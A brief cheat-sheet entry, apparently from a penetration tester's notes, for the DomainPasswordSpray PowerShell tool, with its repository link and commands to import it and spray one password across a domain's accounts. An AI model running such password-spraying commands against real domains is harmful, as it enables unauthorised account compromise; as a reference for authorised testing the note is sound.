---
tags:
  - tool
---
# DomainPasswordSpray

See: https://github.com/dafthack/DomainPasswordSpray

## Capabilities

```powershell
# Import
Import-Module .\DomainPasswordSpray.ps1

# Domain password spray
Invoke-DomainPasswordSpray -Password $PASSWD -OutFile spray_success -ErrorAction SilentlyContinue
```
